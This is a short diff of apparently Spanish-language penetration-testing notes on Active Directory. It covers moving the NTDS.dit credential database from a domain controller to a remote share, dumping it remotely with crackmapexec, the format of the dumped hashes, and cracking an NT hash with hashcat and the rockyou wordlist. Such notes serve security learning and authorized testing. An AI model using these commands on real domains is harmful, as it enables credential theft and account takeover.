@@ -25,6 +25,8 @@ cmd.exe /c move C:\NTDS\NTDS.dit \\<ip>\CompData
 Podemos tambien dumpear el archivo remotamente si tenemos una cuenta de admin:
 crackmapexec smb <ip_dc> -u <user> -p <pass> --ntds
 
+la composición de los hashes dumpeados es:
+uid:rid:lmhash:nthash
 
 luego crackeamos el hash que necesitamos:
 sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
